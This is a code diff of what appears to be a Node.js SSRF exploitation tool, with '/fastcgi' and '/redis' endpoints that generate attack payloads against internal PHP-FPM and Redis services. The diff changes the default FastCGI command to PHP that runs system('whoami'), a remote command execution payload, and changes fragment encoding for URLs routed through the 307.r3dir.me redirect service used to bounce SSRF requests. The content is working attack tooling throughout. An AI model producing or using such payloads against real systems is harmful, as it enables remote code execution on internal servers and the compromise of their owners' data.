@@ -20,7 +20,7 @@ router.post('/fastcgi', validate([
         fastcgi.host = req.body.host || '127.0.0.1';
         fastcgi.port = req.body.port || 9000;
         fastcgi.filename = req.body.filename || '/usr/share/php/PEAR.php';
-        fastcgi.command = req.body.command || 'whoami';
+        fastcgi.command = req.body.command || 'system("whoami");';
 
         let generated = fastcgi.generatePayload();
         if (req.body.urlencode) {
@@ -29,7 +29,7 @@ router.post('/fastcgi', validate([
         generated = generated.replaceAll("%2F", '/').replaceAll("%3A", ':');
         if (req.body.r3dir) {
             if (req.body.suffix) {
-                res.send("//307.r3dir.me/--to/?url=" + generated + "%2F%23" + req.body.suffix);
+                res.send("//307.r3dir.me/--to/?url=" + generated + "%23%2F" + req.body.suffix);
             } else {
                 res.send("//307.r3dir.me/--to/?url=" + generated);
             }
@@ -66,7 +66,7 @@ router.post('/redis', validate([
         generated = generated.replaceAll("%2F", '/').replaceAll("%3A", ':');
         if (req.body.r3dir) {
             if (req.body.suffix) {
-                res.send("//307.r3dir.me/--to/?url=" + generated + "%2F%23" + req.body.suffix);
+                res.send("//307.r3dir.me/--to/?url=" + generated + "%23%2F" + req.body.suffix);
             } else {
                 res.send("//307.r3dir.me/--to/?url=" + generated);
             }
